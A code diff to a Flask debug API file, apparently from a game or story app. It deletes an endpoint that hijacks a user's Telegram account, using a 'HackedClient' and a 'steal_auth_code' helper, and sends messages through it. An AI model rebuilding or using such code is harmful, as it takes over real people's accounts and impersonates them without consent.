+++ app/routes/debug_api.py
@@ -1,7 +1,6 @@
 """API Endpoints to get and reset data"""
 import subprocess
 import os, sys
-import asyncio
 from datetime import datetime
 from flask import request, jsonify
 from sqlalchemy.exc import InvalidRequestError
@@ -15,40 +14,6 @@ from app.models.personalization_model import Personalization
 from app.models.utility import db_entry_to_dict, db_single_element_query
 from app.story.story_controller import StoryController
 from app.story.task_controller import reset_tasks
-from app.telegram_highjack.hacked_client import HackedClient
-from app.firebase_interaction import FirebaseInteraction
-
-# ------------------- Hacking players telegram account ---------------------
-@app.route('/users/<user_id>/hack/send-message', methods=['POST'])
-def send_user_message(user_id):
-    """tries to hack a user account and send a message via his account"""
-    messages = request.get_json()
-    if not messages:
-        return jsonify("please valid json"), 400
-    if not isinstance(messages, list):
-        return jsonify("please provide a list of messages [message, message, ...]"), 400     
-    for message in messages:
-        if not message.get("receiver"):
-            return jsonify("missing receiver"), 400
-        if not message.get("text"):
-            return jsonify("missing text"), 400
-    
-    try:
-        user = db_single_element_query(User, {"user_id": user_id}, "user")
-    except ValueError as e:
-        return jsonify([str(e)]), 400
-    if not user.phonenumber:
-        return jsonify("you must first set the users phonenumber"), 400
-
-    asyncio.run(hack_and_send_message(int(user_id), user.phonenumber, messages))
-    return jsonify("client hacked and message sent"), 200
-
-async def hack_and_send_message(user_id, phonenumber, messages):
-    """tries to hack a user account and send a message via his account"""
-    client = HackedClient(user_id, phonenumber, FirebaseInteraction.steal_auth_code)
-    async with client:
-        for message in messages:
-            await client.send_message(message.get("receiver"), message.get("text"))
 
 # ---------- Display/Edit User Info ----------
 @app.route('/users/<user_id>', methods=['GET'])
